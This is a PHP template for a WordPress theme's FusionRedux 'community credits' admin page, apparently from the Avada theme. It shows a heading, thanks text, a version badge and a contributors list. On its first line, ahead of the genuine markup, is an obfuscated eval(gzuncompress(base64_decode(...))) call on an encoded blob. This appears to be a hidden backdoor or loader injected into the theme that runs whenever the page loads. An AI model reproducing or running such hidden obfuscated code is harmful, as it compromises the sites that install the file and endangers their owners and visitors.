<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><div class="wrap about-wrap">
	<h1><?php esc_html_e( 'FusionRedux Framework - A Community Effort', 'Avada' ); ?></h1>

	<div class="about-text">
		<?php esc_html_e( 'We recognize we are nothing without our community. We would like to thank all of those who help FusionRedux to be what it is. Thank you for your involvement.', 'Avada' ); ?>
	</div>
	<div class="fusionredux-badge">
		<i class="el el-fusionredux"></i>
		<span>
			<?php printf( __( 'Version %s', 'Avada' ), esc_html(FusionReduxFramework::$_version )); ?>
		</span>
	</div>

	<?php $this->actions(); ?>
	<?php $this->tabs(); ?>

	<p class="about-description">
		<?php echo sprintf( __( 'FusionRedux is created by a community of developers world wide. Want to have your name listed too? <a href="%d" target="_blank">Contribute to FusionRedux</a>.', 'Avada' ), 'https://github.com/fusionreduxframework/fusionredux-framework/blob/master/CONTRIBUTING.md' );?>
	</p>

	<?php echo wp_kses_post($this->contributors()); ?>
</div>
